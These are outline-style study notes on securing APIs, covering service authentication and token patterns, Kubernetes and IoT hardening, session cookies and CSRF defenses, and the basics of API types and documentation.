&nbsp;			§ Derive many purpose-specific keys from one high-entropy master key using HKDF-Expand(context). Reduces number of stored secrets; supports automatic rotation by changing context (e.g., include date). (Don’t reuse the same key for multiple purposes.)

&nbsp;		○ Confused deputy \& propagating user context

&nbsp;			§ Passing only the service’s identity can let it be abused to perform privileged actions.

&nbsp;			§ Phantom token pattern: gateway introspects a long-lived opaque token and swaps it for a short-lived signed JWT tailored to each backend—fast local verification, least-privilege scopes/audience, easy revocation at the edge.

&nbsp;			§ OAuth2 Token Exchange (RFC 8693): standard way to trade one token for another, adding an act claim to show “service acting for user.” Better across trust boundaries; heavier (extra AS roundtrip).

&nbsp;			§ Macaroons: capability-style tokens where each hop can add caveats (time/resource/user). Efficient local restriction without AS calls.

&nbsp;	• Practical trade-offs \& guidance

&nbsp;		○ Choosing a client auth method

&nbsp;			§ Simple \& external partners: API keys/JWT bearer (but plan revocation, narrow scopes, strict audiences, short expiry).

&nbsp;			§ You already run OAuth2: Client Credentials (introspection + revocation).

&nbsp;			§ Need user-like roles/central user store: Service accounts (avoid ROPC; prefer JWT bearer or mTLS).

&nbsp;			§ Avoid shared secrets/enable rotation: JWT bearer grant with JWKs.

&nbsp;			§ Strongest transport-level auth / PoP tokens: mTLS, optionally with certificate-bound tokens.

&nbsp;		○ Inside a cluster

&nbsp;			§ Prefer service mesh mTLS + forwarded identity headers (SPIFFE) to authenticate services.

&nbsp;			§ If tokens must be used, consider certificate-bound tokens to prevent replay.

&nbsp;		○ Secrets

&nbsp;			§ Prefer vault/KMS over raw K8s secrets; if you must use K8s secrets: encrypt etcd at rest, mount as files, lock down namespaces/RBAC, never check secrets into git.

&nbsp;			§ Use short-lived bootstrap tokens + controller injection; rotate aggressively.

&nbsp;			§ Use HKDF to derive per-purpose keys and avoid key sprawl.

&nbsp;		○ Passing user context

&nbsp;			§ Within one trust boundary: phantom tokens for speed + least privilege.

&nbsp;			§ Across orgs/boundaries: token exchange (clear delegation via act).

&nbsp;			§ Alternative: macaroons when you want hop-by-hop, local capability scoping.

&nbsp;		○ Gotchas (security pitfalls to avoid)

&nbsp;			§ Don’t mix up user vs service tokens—APIs must be able to tell which they are.

&nbsp;			§ Bearer anything (API key/JWT) can be replayed if stolen—keep expirations short; set aud, iss, jti; prefer PoP (cert-bound).

&nbsp;			§ Header spoofing risk: ensure ingress strips/sets auth headers (ssl-client-verify, etc.), ideally with randomized header names or trusted hop checks.

&nbsp;			§ ROPC is legacy; avoid for users and minimize for service accounts.

&nbsp;			§ K8s secrets aren’t encryption; enable etcd encryption (prefer KMS), and beware file exposure/path traversal vulns.

&nbsp;			§ Public key rotation: publish JWKs and rotate with overlapping keys.

&nbsp;		○ Mini-glossary

&nbsp;			§ Client assertion: a signed JWT used to authenticate a client to the token endpoint.

&nbsp;			§ JWK Set: JSON document with one or more public keys for validation/rotation.

&nbsp;			§ cnf / x5t#S256: confirmation key claim holding the SHA-256 thumbprint of the client cert.

&nbsp;			§ SPIFFE ID: standardized URI naming a workload (trust domain + path).

&nbsp;			§ Envelope encryption: data encrypted with a local DEK; DEK encrypted by a KEK in KMS.

&nbsp;			§ Phantom token: short-lived JWT minted by a gateway after introspection.

&nbsp;			§ Token exchange: RFC 8693 flow to swap tokens and add act (delegation chain).

&nbsp;			§ HKDF-Expand: derive new keys from a master HMAC key using a context string.

&nbsp;		○ Quick decision helper

&nbsp;			§ Need revocation + central control? Opaque token + introspection (or phantom tokens behind gateway).

&nbsp;			§ Need zero shared secrets + rotation? JWT bearer grant with JWKs or mTLS client auth.

&nbsp;			§ Worried about token theft? Certificate-bound tokens (PoP).

&nbsp;			§ Lots of services? Mesh mTLS with identity headers + least-privilege scopes.

&nbsp;			§ Secrets everywhere? Vault/KMS + short-lived bootstrap creds + HKDF for per-purpose keys.

&nbsp;			§ User context across hops? Phantom tokens (internal) or Token Exchange (cross-boundary).





#### Microservices APIs in Kubernetes



Main Idea

&nbsp;	• How to run and secure microservice APIs on Kubernetes: package each service in hardened containers, wire them together with Services, secure traffic with a service mesh (mTLS), restrict east–west traffic with NetworkPolicies, and expose the app safely to the outside world through an ingress—all while avoiding pitfalls like SSRF and DNS rebinding.

&nbsp;	• Key Concepts

&nbsp;		○ Microservice: independently deployed service speaking to others via APIs.

&nbsp;		○ Node / Pod / Container: node = VM/host; pod = one-or-more containers; container = one process (typical) + its FS/network view.

&nbsp;		○ Service: stable virtual IP/DNS that load-balances to pods.

&nbsp;		○ Namespace: logical isolation boundary and policy scope.

&nbsp;		○ Privilege separation: put risky work in its own (less-privileged) service.

&nbsp;		○ Ingress controller: cluster edge reverse proxy / LB (TLS termination, routing, rate limit, logging).

&nbsp;		○ Service mesh (Linkerd/Istio): sidecar proxies that auto-TLS (mTLS), observe, and control service-to-service traffic.

&nbsp;		○ NetworkPolicy: allowlist rules for pod ingress/egress inside the cluster.

&nbsp;		○ Zero trust: don’t trust “internal”; authenticate every call.

&nbsp;	• Container security (what “good” looks like)

&nbsp;		○ Use minimal base images (e.g., distroless, Alpine) + multi-stage builds.

&nbsp;		○ Run as non-root (runAsNonRoot: true), no privilege escalation, read-only root FS, drop all Linux capabilities.

&nbsp;		○ Prefer one process per container; use init for one-time setup and sidecars for cross-cutting (e.g., mesh proxy).

&nbsp;	• Kubernetes wiring (Natter example)

&nbsp;		○ Separate deployments/services for API, DB (H2), link-preview.

&nbsp;		○ Internal discovery via Service DNS (e.g., natter-link-preview-service:4567).

&nbsp;		○ Expose externally with Service type NodePort (dev) or, preferably, Ingress (prod).

&nbsp;	• Securing service-to-service traffic

&nbsp;		○ Deploy Linkerd, annotate namespace for proxy injection.

&nbsp;		○ Mesh upgrades HTTP to mTLS automatically between pods; rotate certs; identities are service-scoped.

&nbsp;		○ Note: some non-HTTP protocols may need manual TLS (Linkerd advancing here).

&nbsp;	• Limiting lateral movement

&nbsp;		○ Write NetworkPolicies:

&nbsp;			• Ingress: who can talk to me (labels + ports).

&nbsp;			• Egress: where I’m allowed to call (destinations + ports).

&nbsp;		○ Remember: policies are allowlists; combine to form the union of allowed flows.

&nbsp;	• Securing the cluster edge

&nbsp;		○ Ingress controller (NGINX) handles:

&nbsp;			• TLS termination (K8s Secret with cert/key; cert-manager in prod)

&nbsp;			• Routing (Host/path rules), rate limiting, audit logging.

&nbsp;		○ With a mesh, rewrite upstream Host so ingress→backend also rides mTLS.

&nbsp;	• Defending against common attacks

&nbsp;		○ SSRF (server-side request forgery)

&nbsp;			• Best: strict allowlist of URLs/hosts.

&nbsp;			• If allowlist infeasible: block internal/loopback/link-local/multicast/wildcard IPs (v4/v6), and validate every redirect hop (disable auto-follow; cap redirect depth).

&nbsp;			• Prefer zero trust internally—internal services require auth too.

&nbsp;		○ DNS rebinding

&nbsp;			• Validate Host header against an expected set (or proxy config).

&nbsp;			• Use TLS end-to-end so cert CN/SAN must match hostname.

&nbsp;			• Network/DNS layer: block answers that resolve public names to private IPs.

&nbsp;		○ Practical build/deploy notes

&nbsp;			• Build containers with Jib (no Dockerfile) or hand-rolled Dockerfile using distroless.

&nbsp;			• Keep secrets out of images; use Kubernetes Secrets (Chapter 11).

&nbsp;			• Make pods reproducible; keep YAML under version control.

&nbsp;	• Why this matters

&nbsp;		○ Confidentiality \& integrity of inter-service calls (mTLS) + least privilege at container and network layers = strong defense-in-depth.

&nbsp;		○ Clear blast-radius boundaries (privilege separation + policies) make incidents containable.

&nbsp;		○ Ingress centralizes edge security so teams don’t re-solve TLS/rate limiting.

&nbsp;	• Quick checklists

&nbsp;		○ Harden a deployment

&nbsp;			• Distroless/minimal base; multi-stage build

&nbsp;			• runAsNonRoot, allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, drop caps

&nbsp;			• Expose only needed ports

&nbsp;		○ Enable secure comms

&nbsp;			• Annotate namespace for mesh injection

&nbsp;			• Verify mTLS via linkerd tap (or mesh dashboard)

&nbsp;		○ Constrain the network

&nbsp;			• NetworkPolicies for DB (ingress from API only; no egress)

&nbsp;			• Policies for each service pair (ingress/egress)

&nbsp;		○ Protect the edge

&nbsp;			• Ingress TLS with real certs; rate limit + logs

&nbsp;			• If meshed, set upstream Host rewrite for mTLS to backends

&nbsp;		○ Defend link-preview (and similar fetchers)

&nbsp;			• Prefer allowlist; else block private IPs (v4/v6)

&nbsp;			• Validate each redirect; cap to N hops

&nbsp;			• Validate Host header; use TLS; timeouts; small fetch windows





#### Session Cookie Authentication



Main Idea

&nbsp;	• Move from “send username+password on every request” (HTTP Basic) to token-based auth for browser clients—specifically session cookies—and harden them against CSRF and session fixation. Build a tiny same-origin UI to show how browsers, cookies, and headers actually behave.

&nbsp;	• Key concepts (what, why, how)

&nbsp;		○ Why not Basic in browsers

&nbsp;			§ Password sent on every call; costly (password hashing each time) and risky if any endpoint leaks it.

&nbsp;			§ Ugly browser prompts; hard to “log out.”

&nbsp;		○ Token-based auth

&nbsp;			§ Login once → issue short-lived token; present token on subsequent calls until expiry.

&nbsp;			§ Implement via a TokenStore abstraction (create/read/revoke) so backends can change.

&nbsp;		○ Session cookies as the token

&nbsp;			§ Use Spark’s session (JSESSIONID) as the server-side token; store user, expiry, attributes on the session.

&nbsp;			§ Cookie security attributes: Secure, HttpOnly, SameSite (lax/strict), plus Path, Domain, Max-Age/Expires.

&nbsp;			§ Prefer \_\_Host- or \_\_Secure- cookie name prefixes for built-in safeguards.

&nbsp;		○ Same-origin UI \& SOP

&nbsp;			§ Serve HTML/JS from the same origin as the API to avoid CORS issues; use Spark.staticFiles.location("/public").

&nbsp;			§ The browser’s same-origin policy governs what JS can request/read.

&nbsp;		○ Session fixation (must fix on login)

&nbsp;			§ If a preexisting session is reused at login, an attacker can preseed a victim’s session ID.

&nbsp;			§ Mitigation: on successful auth, invalidate any existing session and create a fresh session.

&nbsp;		○ Authenticating requests with the cookie

&nbsp;			§ A request is treated as authenticated if a valid, unexpired session exists; set request.attribute("subject") so downstream filters work.

&nbsp;		○ CSRF: the big risk with cookies

&nbsp;			§ Because browsers auto-attach cookies cross-site, other origins can make state-changing calls “as you.”

&nbsp;			§ Defenses:

&nbsp;				• SameSite cookies (lax/strict) — good baseline for first-party apps.

&nbsp;				• Double-submit token (hash-based) — robust defense:

&nbsp;					• Server returns a CSRF token that is SHA-256(sessionID), Base64url-encoded.

&nbsp;					• Client sends it on each write request as X-CSRF-Token header.

&nbsp;					• Server recomputes SHA-256(sessionID) and compares with constant-time equality; reject if absent/mismatch.

&nbsp;					• Store CSRF token in a non-HttpOnly cookie (or other client storage) so JS can read and echo it.

&nbsp;				• Suppressing Basic auth popups

&nbsp;					• For 401s in a JS app, omit WWW-Authenticate so the browser doesn’t show the default dialog; app redirects to /login.html.

&nbsp;				• Logout

&nbsp;					• Expose DELETE /sessions; read CSRF token from header; invalidate the server session (and thus the cookie). Avoid putting tokens in URLs.

&nbsp;	• Implementation blueprint (in order)

&nbsp;		○ Serve UI from same origin; simple fetch-based forms.

&nbsp;		○ Add /sessions POST (login): Basic-auth -> create fresh session -> return CSRF token (hash of session ID).

&nbsp;		○ Add CookieTokenStore; on create: invalidate old session; set attributes; return hashed token.

&nbsp;		○ Add validateToken filter: read X-CSRF-Token; if present and not expired, set subject.

&nbsp;		○ Mark sensitive routes to require auth; client JS includes X-CSRF-Token on writes.

&nbsp;		○ Add DELETE /sessions for logout (verify CSRF; invalidate session).

&nbsp;	• Gotchas \& good defaults

&nbsp;		○ Always HTTPS; mark auth cookies Secure; HttpOnly; SameSite=strict (or lax if UX needs link navigation).

&nbsp;		○ Never change server state on GET.

&nbsp;		○ Use constant-time comparison for secrets (e.g., MessageDigest.isEqual).

&nbsp;		○ Avoid Domain on cookies unless necessary; prefer host-only (\_\_Host-…) to resist subdomain issues.

&nbsp;		○ Do not rely solely on “JSON Content-Type” or “custom headers” tricks for CSRF—use real CSRF tokens.

&nbsp;	• When session cookies are a good fit

&nbsp;		○ First-party, same-origin browser apps.

&nbsp;		○ You want automatic cookie handling + browser protections (Secure/HttpOnly/SameSite).

#### What is API Security?



Main Idea

&nbsp;	• APIs are ubiquitous and therefore high-value targets. “API security” = define what must be protected (assets), decide what “secure” means for your context (security goals), understand who/what can threaten those goals (threat model), and apply the right mechanisms (encryption, authN/Z, logging, rate-limits). It’s iterative—not a one-and-done checkbox.

&nbsp;	• What is an API (and Styles)

&nbsp;		○ API = boundary + contract between components; optimized for software consumption (vs a UI for humans).

&nbsp;		○ Styles \& trade-offs

&nbsp;			• RPC/gRPC/SOAP: efficient, tight coupling via stubs.

&nbsp;			• REST(ful): uniform interface, looser coupling, evolvability.

&nbsp;			• GraphQL/SQL-like: few ops, rich query language.

&nbsp;			• Microservices: many internal APIs; security spans service-to-service too.

&nbsp;	• API security in context

&nbsp;		○ Security sits at the intersection of:

&nbsp;			• InfoSec (protect data lifecycle; crypto, access control),

&nbsp;			• NetSec (TLS/HTTPS, firewalls, network posture),

&nbsp;			• AppSec (secure coding, common vulns, secrets handling).

&nbsp;	• Typical deployment stack (where controls live)

&nbsp;		○ Firewall → Load balancer → Reverse proxy/API gateway → App servers

&nbsp;		○ Extras: WAF, IDS/IPS. Gateways often do TLS termination, auth, and rate-limits, but bad app design can still undermine them.

&nbsp;	• Elements to define before building

&nbsp;		○ Assets: data (PII, credentials), systems, logs, even session cookies/keys.

&nbsp;		○ Security goals (NFRs): CIA triad—Confidentiality, Integrity, Availability—plus accountability, privacy, non-repudiation.

&nbsp;		○ Environment \& threat model: which attackers matter here? Use dataflow diagrams and trust boundaries to reason about risk.

&nbsp;		○ Threat categories: STRIDE = Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege.

&nbsp;	• Core mechanisms you’ll apply

&nbsp;		○ Encryption

&nbsp;			• In transit: TLS/HTTPS; hides and integrity-protects traffic.

&nbsp;					® At rest: database/filesystem encryption (context-dependent).

&nbsp;		○ Identification \& Authentication

&nbsp;					® Why: accountability, authorization decisions, DoS mitigation.

&nbsp;			• Factors: something you know (password), have (security key/app), are (biometrics). Prefer MFA/2FA.

&nbsp;		○ Authorization / Access control

&nbsp;					® Identity-based: who you are → what you can do (roles/policies).

&nbsp;					® Capability-based: what this unforgeable token lets you do (fine-grained, delegable).

&nbsp;				□ Audit logging

&nbsp;					® Record who/what/when/where/outcome; protect logs from tampering; mind PII.

&nbsp;				□ Rate-limiting \& quotas

&nbsp;				□ Preserve availability and absorb spikes/DoS; throttle or reject before resources are exhausted; often implemented at the gateway/LB.

&nbsp;	• Design \& testing mindset

&nbsp;		○ Don’t judge ops in isolation; compositions can be insecure (e.g., deposit + withdrawal vs a single atomic transfer).

&nbsp;		○ Turn abstract goals into testable constraints; iterate as new assets/assumptions emerge.

&nbsp;		○ There’s no absolute security; make context-appropriate trade-offs (e.g., GDPR/PII obligations, breach reporting).

&nbsp;	• Analogy mapping (driving test story → API concepts)

&nbsp;		○ Recognizing Alice vs showing a license → identification vs authentication levels.

&nbsp;		○ Train ticket / club celebrity / house keys → authorization models and delegation scope.

&nbsp;		○ CCTV footage → audit logs (accountability, non-repudiation).

&nbsp;	• Quick checklist to apply

&nbsp;		○ List assets (incl. credentials, tokens, logs).

&nbsp;		○ Decide goals (CIA + accountability/privacy).

&nbsp;		○ Draw a dataflow diagram; mark trust boundaries.

&nbsp;		○ Enumerate threats with STRIDE.

&nbsp;		○ Enforce TLS everywhere; plan for at-rest encryption as needed.

&nbsp;		○ Choose auth (with MFA) and authz (roles/capabilities).

&nbsp;		○ Implement audit logging (tamper-resistant).

&nbsp;		○ Add rate-limits/quotas and input size/time guards.

&nbsp;		○ Validate end-to-end flows (not just endpoints).

&nbsp;		○ Revisit the model regularly; update tests and controls.

#### Securing IoT Communications



Main Idea

&nbsp;	• Securing IoT communication needs different choices than classic web APIs because devices are constrained, often use UDP, hop across heterogeneous networks, and face physical/nonce/entropy pitfalls. Use DTLS (or emerging QUIC) thoughtfully, prefer cipher suites and message formats that fit constrained hardware, add end-to-end protection above transport, and manage keys for scale and forward secrecy.

&nbsp;	• Why TLS “as usual” doesn’t fit IoT

&nbsp;		○ Constrained nodes: tiny CPU/RAM/flash/battery.

&nbsp;		○ UDP \& small packets: CoAP/UDP, multicast, sleep cycles.

&nbsp;		○ Protocol gateways: BLE/Zigbee → MQTT/HTTP breaks pure end-to-end TLS.

&nbsp;		○ Physical/side-channel risks and weak randomness sources.

&nbsp;	• Transport-layer security (DTLS/QUIC)

&nbsp;		○ DTLS = TLS for UDP. Same guarantees, but packets can reorder/replay; needs app-level handling.

&nbsp;		○ Java note: DTLS via low-level SSLEngine (handshake states: NEED\_WRAP/UNWRAP/TASK); higher-level libs (e.g., CoAP stacks) hide this.

&nbsp;		○ QUIC/HTTP-3: UDP with built-in TLS 1.3; promising for low-latency IoT but not yet ubiquitous.

&nbsp;	• Cipher suites for constrained devices

&nbsp;		○ Avoid AES-GCM with DTLS on constrained gear (easy to misuse nonces; catastrophic if reused).

&nbsp;		○ Prefer:

&nbsp;			§ ChaCha20-Poly1305 (fast, small, software-friendly).

&nbsp;			§ AES-CCM (good with AES hardware; choose 128-bit tag; avoid \_CCM\_8 unless bytes are critical + strong compensations).

&nbsp;		○ Favor forward secrecy (ECDHE) when you can; TLS 1.3 removes weak key exchanges.

&nbsp;		○ Consider raw public keys (DTLS RFC 7250) to ditch X.509 parsing on devices.

&nbsp;	• Pre-Shared Keys (PSK)

&nbsp;		○ Why: remove cert/signature code; huge footprint savings.

&nbsp;		○ Rules: PSKs must be strong random keys (≥128-bit); never passwords (offline guessing).

&nbsp;		○ Flavors:

&nbsp;			§ Raw PSK (no FS) → simplest, but past sessions fall if key leaks.

&nbsp;			§ PSK + (EC)DHE → adds forward secrecy with moderate cost.

&nbsp;		○ Server must map PSK identity → device identity.

&nbsp;	• End-to-end (E2E) security above transport

&nbsp;		○ Transport (TLS/DTLS) protects each hop; gateways still see plaintext. Add message-level AEAD:

&nbsp;			§ COSE over CBOR for IoT (JOSE/JSON analogs).

&nbsp;			§ Use HKDF to derive per-message keys and bind context (sender/receiver IDs, message type, direction) to stop replay/reflection.

&nbsp;			§ Pragmatic alternative: NaCl/libsodium (SecretBox/CryptoBox) for fixed, safe primitives with simple APIs.

&nbsp;		○ Nonces \& misuse resistance

&nbsp;			§ Constrained devices often have poor randomness → nonce reuse risk.

&nbsp;			§ Safer AE modes:

&nbsp;				□ SIV-AES (MRAE): tolerates repeated nonces without total failure (still aim for unique nonces; include random IV as associated data). Needs only AES-ENC (good for HW).

&nbsp;	• Key distribution \& lifecycle

&nbsp;		○ Provisioning: per-device keys at manufacture (in ROM/secure element) or derive from master via HKDF using device IDs.

&nbsp;		○ Key distribution servers: enroll device, rotate keys periodically; can piggyback on OAuth2/JWT/CBOR tokens.

&nbsp;		○ Ratcheting: symmetric key evolution (e.g., HKDF or AES-CTR with reserved IV) for forward secrecy over time.

&nbsp;		○ Post-compromise security: best with hardware (TPM/TEE/secure element) or occasional ephemeral DH mixes; hard to guarantee if attacker stays in the loop.

&nbsp;	• Threats \& hardening notes

&nbsp;		○ Side-channel/fault attacks: prefer constant-time primitives (ChaCha20), secure elements, certifications (FIPS/CC).

&nbsp;		○ Replay/rate-limit: timestamps/counters, strict API rate limits (esp. with short MAC tags).

&nbsp;		○ Identity binding: include sender/receiver identities and context in AEAD associated data.

&nbsp;	• Key terms

&nbsp;		○ DTLS: TLS for UDP.

&nbsp;		○ Constrained device: tight CPU/RAM/energy/connectivity.

&nbsp;		○ PSK: pre-shared symmetric key; mutual auth.

&nbsp;		○ COSE/CBOR: JOSE/JSON’s compact binary siblings.

&nbsp;		○ MRAE / SIV-AES: misuse-resistant AE; resilient to nonce reuse.

&nbsp;		○ Ratcheting: one-way key updates for forward secrecy.

&nbsp;	• Practical checklist

&nbsp;		○ If you use UDP, use DTLS (or QUIC where it fits).

&nbsp;		○ Pick ChaCha20-Poly1305 (default) or AES-CCM (with AES HW).

&nbsp;		○ Avoid AES-GCM on DTLS unless you are 100% sure about nonces.

&nbsp;		○ Use raw public keys or PSK to cut code size; add (EC)DHE if you can for FS.

&nbsp;		○ Add message-level E2E AEAD (COSE or NaCl) across gateways.

&nbsp;		○ HKDF per-message keys + context binding; include anti-replay (counters/timestamps).

&nbsp;		○ Rotate keys via ratchets; plan secure provisioning and distribution.

&nbsp;		○ Consider secure elements/TEE for tamper resistance and post-compromise recovery.





#### Securing IoT APIs



Main Ideas

&nbsp;	• IoT APIs must authenticate devices (not just users), prove freshness to stop replays, fit OAuth2 to constrained UX/hardware, and continue making local auth decisions when offline. Use transport-layer auth when you can; otherwise add end-to-end request auth with replay defenses. For consumer IoT, use the OAuth device grant; for deeply constrained stacks, use ACE-OAuth with PoP tokens.

&nbsp;	• Device identity \& transport-layer auth

&nbsp;		○ Device profiles: store device\_id, make/model, and an encrypted PSK (or public key). Create during manufacturing/onboarding.

&nbsp;		○ Device “certificates” without PKI: signed JWT/CWT holding device attributes + encrypted PSK the API can decrypt.

&nbsp;		○ TLS/DTLS PSK auth: client sends PSK identity in handshake; server looks up device profile → decrypts PSK → mutual auth.

&nbsp;			§ Only trust the PSK ID after the handshake (it’s authenticated then).

&nbsp;			§ Expose device identity to the app layer to drive authorization.

&nbsp;	• End-to-end authentication (beyond transport)

&nbsp;		○ Gateways break pure end-to-end TLS; add message-level auth (COSE/NaCl) so only API can open/verify the request.

&nbsp;		○ Entity authentication = message authentication + freshness.

&nbsp;			§ Freshness options:

&nbsp;				□ Timestamps (weakest; allow windowed replays).

&nbsp;				□ Unique nonces / counters (server stores seen nonces / highest counter).

&nbsp;				□ Challenge–response (server sends nonce; strongest, extra round trip).

&nbsp;		○ Beware delay/reorder attacks (not just replay).

&nbsp;	• OSCORE in one glance (end-to-end for CoAP)

&nbsp;		○ Uses PSK + COSE to protect CoAP end-to-end.

&nbsp;		○ Maintains a security context:

&nbsp;			§ Common: Master Secret (+ optional Salt), algorithms, Common IV (all via HKDF).

&nbsp;			§ Sender: Sender ID, Sender Key, sequence number (Partial IV).

&nbsp;			§ Recipient: Recipient ID/Key, replay window.

&nbsp;		○ Nonces = function(Common IV, Sender ID, sequence#). Deterministic → store state reliably to avoid nonce reuse.

&nbsp;		○ Messages are COSE\_Encrypt0; Sender ID + Partial IV go in (unprotected) headers but are authenticated via external AAD.

&nbsp;		○ Recipient tracks replay (window) or rely on sticky routing/synchronized state across servers.

&nbsp;	• Replay-safe REST patterns

&nbsp;		○ Idempotency helps but isn’t sufficient by itself.

### API Documentation

#### API Foundations



What is an API?

&nbsp;	• An API (Application Programming Interface) is a middle layer that enables communication and interaction between two applications, systems, or programs. It allows developers to reuse existing functionality and data instead of building everything from scratch.

&nbsp;	• Key Concepts

&nbsp;		○ Definition of API

&nbsp;			§ Stands for Application Program Interface.

&nbsp;			§ Serves as an interface between two programs or systems.

&nbsp;			§ Can be software that connects applications.

&nbsp;		○ Purpose of APIs

&nbsp;			§ Organizations expose data or functionality publicly via endpoints.

&nbsp;			§ Developers can pull and integrate that data into their own applications.

&nbsp;			§ Promotes reuse of existing capabilities instead of duplicating effort.

&nbsp;		○ How APIs Work

&nbsp;			§ Example flow:

&nbsp;				□ Database ↔ Web Server ↔ API ↔ Web Application ↔ User (Internet)

&nbsp;			§ APIs handle requests from one application and deliver a response after interacting with servers and databases.

&nbsp;		○ Examples

&nbsp;			§ Stock prices: An app can fetch real-time stock data from another application’s API.

&nbsp;			§ Weather apps: When checking the weather, the app sends a request to a web server through an API, which fetches data from a database and returns it.

&nbsp;		○ Request–Response Model

&nbsp;			§ Request: Sent by the client application (e.g., stock app asking for prices).

&nbsp;			§ Response: Returned by the API after fetching/processing the requested data.

&nbsp;		○ Modern Relevance

&nbsp;			§ APIs are essential in today’s world for interoperability, integration, and efficiency.

&nbsp;			§ Many organizations rely on APIs provided by others instead of reinventing similar functionality.



Types of APIs

&nbsp;	• APIs, specifically web APIs (using HTTP), can be classified into four main types—Open, Partner, Internal, and Composite—based on access levels and scope of use. Each type serves a distinct purpose and has different implications for security, accessibility, and performance.

&nbsp;	• Key Concepts

&nbsp;		○ Open (Public) APIs

&nbsp;			§ Also called External APIs.

&nbsp;			§ Available for anyone to use (with little or no authentication).

&nbsp;			§ Can be free or subscription-based (depending on usage volume).

&nbsp;			§ Business advantage: Wider reach, more developers use their services, increased value of their APIs.

&nbsp;			§ Developer advantage: Easy access to data with minimal restrictions.

&nbsp;		○ Partner APIs

&nbsp;			§ Restricted to specific partners/business collaborators.

&nbsp;			§ Requires stronger authentication (e.g., license keys, secure tokens).

&nbsp;			§ Business advantage: More control over how data is shared/used and with whom.

&nbsp;			§ Used to strengthen business collaborations.

&nbsp;		○ Internal (Private) APIs

&nbsp;			§ Not for public use—restricted to internal systems within an organization.

&nbsp;			§ Enable communication between internal systems and applications.

&nbsp;			§ Useful when new systems are integrated with existing infrastructure.

&nbsp;			§ Advantage: Keeps internal workflows and data secure and organized.

&nbsp;		○ Composite APIs

&nbsp;			§ Bundle multiple API requests into one, returning a single response.

&nbsp;			§ Useful when data needs to be fetched from multiple servers or sources.

&nbsp;			§ Advantages:

&nbsp;				□ Reduces number of calls (less server load).

&nbsp;				□ Improves speed and performance.

#### API Documentation



What is API Documentation?

&nbsp;	• API documentation is like a user manual for an API. Even the best API is ineffective without proper documentation. Good documentation ensures developers understand, integrate, and use the API efficiently, ultimately leading to higher consumer satisfaction.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of API Documentation

&nbsp;			§ Explains the complete functionality of the API.

&nbsp;			§ Serves as a guide/manual for developers.

&nbsp;			§ Provides consumer satisfaction by making the API easy to use.

&nbsp;		○ What It Should Include

&nbsp;			§ Purpose of the API: What it is designed to do.

&nbsp;			§ Inputs/parameters: What needs to be passed for proper usage.

&nbsp;			§ Integration details: How to connect and use the API effectively.

&nbsp;			§ Best practices: The most efficient way to use the API.

&nbsp;			§ Examples and tutorials: Practical demonstrations that improve understanding.

&nbsp;		○ Benefits of Good Documentation

&nbsp;			§ Helps developers quickly and effectively use the API.

&nbsp;			§ Enhances analytical skills of developers by providing real-world examples.

&nbsp;			§ Improves integration speed and reduces errors.

&nbsp;			§ Leads to better adoption of the API.

&nbsp;		○ Ways to Create Documentation

&nbsp;			§ Written manually (detailed custom documentation).

&nbsp;			§ Generated using automation tools (to speed up creation and maintenance).

&nbsp;		○ Importance in API Lifecycle

&nbsp;			§ Documentation is a crucial phase in the API development lifecycle.

&nbsp;			§ Without it, even a powerful API may go unused.



Importance of API Documentation

&nbsp;	• Good API documentation is essential for adoption, usability, and long-term success of APIs. It acts like an instruction manual, saving time, reducing costs, improving developer experience, and increasing the popularity of APIs.

&nbsp;	• Key Concepts

&nbsp;		○ Ease of Use for Developers

&nbsp;			§ Developers prefer APIs with clear instructions so they can quickly integrate them.

&nbsp;			§ Good documentation makes APIs easy to plug into applications without guesswork.

&nbsp;			§ Reduces frustration and increases consumer satisfaction.

&nbsp;		○ Technology Independence

&nbsp;			§ Documentation should be understandable by anyone, even without a deep technical background.

&nbsp;			§ Makes APIs accessible to a wider audience.

&nbsp;		○ Faster Onboarding

&nbsp;			§ New developers can get started quickly by following documentation.

&nbsp;			§ Saves time during training and ramp-up phases.

&nbsp;		○ Time and Cost Savings

&nbsp;			§ Clear documentation reduces the need for direct support from API providers.

&nbsp;			§ Consumers can self-serve answers to questions.

&nbsp;			§ Saves money for both providers and consumers.

&nbsp;		○ Easy Maintainability

&nbsp;			§ Good documentation includes details like requests, responses, and integrations.

&nbsp;			§ This makes maintenance, debugging, and updates much easier.

&nbsp;		○ Popularity and Adoption

&nbsp;			§ Well-documented APIs are more likely to gain widespread adoption.

&nbsp;			§ High consumer satisfaction leads to word-of-mouth popularity.

&nbsp;			§ Many of the most popular public APIs succeed because of excellent documentation.



#### Components of API Documentation



Name, Description, and Endpoints

&nbsp;	• Clear and well-structured API documentation components—such as name, description, and endpoints—are critical for helping developers understand and use an API effectively. These elements provide context, usability, and technical entry points.

&nbsp;	• Key Concepts

&nbsp;		○ Name

&nbsp;			§ Should be meaningful and self-explanatory.

&nbsp;			§ Provides a gist of the API’s purpose even without reading the description.

&nbsp;			§ Example: An API named Product immediately signals it deals with product-related data.

&nbsp;		○ Description

&nbsp;			§ Explains how the API can be used in real-world scenarios.

&nbsp;			§ Focuses on business use cases, not just technical details.

&nbsp;			§ Example: For a sports store API, the description might say it provides details of all products in the store.

&nbsp;			§ Can include subsections for specific functionality, like Product by ID or Product by Name, each with its own description.

&nbsp;		○ Endpoints

&nbsp;			§ One of the most important parts of API documentation.

&nbsp;			§ Endpoints are essentially URLs that define where and how the API communicates with systems.

&nbsp;			§ Each touchpoint in communication is considered an endpoint.

&nbsp;			§ Documentation usually provides:

&nbsp;				□ Base URL at the top (common to all calls).

&nbsp;				□ Specific endpoints for different actions (only the changing parts are listed separately).



Authorization, Parameters, and Headers

&nbsp;	• API documentation must clearly include authorization/authentication methods, parameters, and headers, as these are critical for controlling access, structuring API calls, and providing additional context in communication between clients and servers.

&nbsp;	• Key Concepts

&nbsp;		○ Authorization \& Authentication

&nbsp;			§ Authentication: Identifies who can access the API.

&nbsp;			§ Authorization: Determines what actions the authenticated user can perform.

&nbsp;			§ Analogy: Authentication = showing ID, Authorization = what access rights that ID grants.

&nbsp;			§ Common types of API authentication:

&nbsp;				□ None: No authentication (e.g., for internal APIs).

&nbsp;				□ Basic Auth: Username \& password sent with each API call.

&nbsp;				□ API Key Auth: Long, unique tokens sent with each call.

&nbsp;				□ OAuth: Auto-approves and securely manages developer access.

&nbsp;			§ Documentation requirement: Must specify the type of authorization, what’s needed (username, password, token, etc.), and how to provide it.

&nbsp;		○ Parameters

&nbsp;			§ Represent the variable part of a resource in an API call.

&nbsp;			§ Consist of name + value pairs.

